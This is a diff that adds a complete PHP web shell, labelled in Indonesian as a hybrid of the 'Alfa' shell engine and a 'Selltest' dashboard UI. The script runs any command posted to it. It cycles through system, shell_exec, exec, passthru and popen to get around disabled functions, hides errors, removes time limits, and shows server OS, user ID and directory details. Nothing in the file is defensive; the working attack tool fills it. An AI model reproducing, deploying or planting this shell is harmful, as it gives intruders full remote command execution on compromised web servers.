@@ -1,0 +1,222 @@
+<?php
+/**
+ * Hybrid Shell: Tampilan Selltest x Fitur Alfa
+ * Gabungan UI Dashboard Elegan dengan Engine Eksekusi Kuat.
+ */
+
+// ===================================================================
+// 1. BAGIAN DALAM / SC ALFA ENGINE (Logika & Fitur Eksekusi)
+// ===================================================================
+error_reporting(0);
+set_time_limit(0);
+
+// Mengambil info sistem untuk ditampilkan di dashboard
+$sys_os   = php_uname();
+$sys_user = get_current_user() . " (Uid: " . @getmyuid() . " / Gid: " . @getmygid() . ")";
+$php_ver  = phpversion();
+$current_dir = getcwd();
+
+// Fitur Eksekusi Perintah (Core Alfa)
+$output = "";
+if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
+    $command = $_POST['cmd'];
+    
+    // Metode bypass eksekusi perintah multi-fungsi
+    if (function_exists('system')) {
+        ob_start(); system($command); $output = ob_get_clean();
+    } elseif (function_exists('shell_exec')) {
+        $output = shell_exec($command);
+    } elseif (function_exists('exec')) {
+        exec($command, $res); $output = join("\n", $res);
+    } elseif (function_exists('passthru')) {
+        ob_start(); passthru($command); $output = ob_get_clean();
+    } elseif (function_exists('popen')) {
+        $fp = popen($command, 'r');
+        while (!feof($fp)) { $output .= fread($fp, 1024); }
+        pclose($fp);
+    } else {
+        $output = "Semua fungsi eksekusi dinonaktifkan (disable_functions).";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ALFA CORE - SELLTEST UI</title>
+    <!-- =================================================================== -->
+    <!-- 2. TAMPILAN DEPAN / SELLTEST DESIGN (CSS & Style Dashboard)          -->
+    <!-- =================================================================== -->
+    <style>
+        body {
+            background-color: #0f111a;
+            color: #a6accd;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            background: #1a1c2a;
+            border: 1px solid #2f334d;
+            border-radius: 8px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #ff5370, #ff8b92);
+            padding: 20px;
+            color: #fff;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 24px;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+        .sys-info {
+            padding: 15px 20px;
+            background: #23263b;
+            border-bottom: 1px solid #2f334d;
+            font-size: 13px;
+        }
+        .sys-info table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .sys-info td {
+            padding: 4px 8px;
+            vertical-align: top;
+        }
+        .sys-info td.title {
+            color: #ff5370;
+            font-weight: bold;
+            width: 120px;
+        }
+        .content {
+            padding: 20px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #89ddff;
+            font-weight: 500;
+        }
+        .input-cmd {
+            width: 100%;
+            padding: 12px;
+            background: #0f111a;
+            border: 1px solid #3b3f5c;
+            border-radius: 4px;
+            color: #c3e88d;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .input-cmd:focus {
+            outline: none;
+            border-color: #ff5370;
+        }
+        .btn-submit {
+            background: #ff5370;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 600;
+            margin-top: 10px;
+            transition: 0.2s;
+        }
+        .btn-submit:hover {
+            background: #e0435e;
+        }
+        .terminal-box {
+            background: #090b10;
+            border: 1px solid #2f334d;
+            border-radius: 4px;
+            padding: 15px;
+            margin-top: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .terminal-box pre {
+            margin: 0;
+            color: #c3e88d;
+            font-family: 'Courier New', Courier, monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 11px;
+            color: #4e5579;
+            border-top: 1px solid #2f334d;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Bagian Atas Tampilan Selltest -->
+    <div class="header">
+        <h1>ALFA ENGINE × SELLTEST INTERFACE</h1>
+    </div>
+
+    <!-- Informasi Detail Server -->
+    <div class="sys-info">
+        <table>
+            <tr>
+                <td class="title">Sistem OS</td>
+                <td>: <?php echo $sys_os; ?></td>
+            </tr>
+            <tr>
+                <td class="title">User / UID</td>
+                <td>: <?php echo $sys_user; ?></td>
+            </tr>
+            <tr>
+                <td class="title">Versi PHP</td>
+                <td>: <?php echo $php_ver; ?></td>
+            </tr>
+            <tr>
+                <td class="title">Direktori</td>
+                <td>: <span style="color: #ffcb6b;"><?php echo $current_dir; ?></span></td>
+            </tr>
+        </table>
+    </div>
+
+    <!-- Area Kerja / Form (Mesin Alfa) -->
+    <div class="content">
+        <form method="POST" action="">
+            <div class="form-group">
+                <label for="cmd">Terminal Perintah (Execute Command):</label>
+                <input type="text" name="cmd" id="cmd" class="input-cmd" placeholder="Contoh: ls -la, id, whoami, atau uname -a" value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>" autofocus>
+                <button type="submit" class="btn-submit">Kirim Perintah</button>
+            </div>
+        </form>
+
+        <!-- Tempat Output Hasil Console -->
+        <?php if (!empty($output)): ?>
+            <div class="form-group">
+                <label>Hasil Eksekusi:</label>
+                <div class="terminal-box">
+                    <pre><?php echo htmlspecialchars($output); ?></pre>
+                </div>
+            </div>
+        <?php endif; ?>
+    </div>
+
+    <div class="footer">
+        Hybrid Web Shell &copy; 2026 - Tampilan Terbuka, Fitur Di Dalam.
+    </div>
+</div>
+
+</body>
+</html>
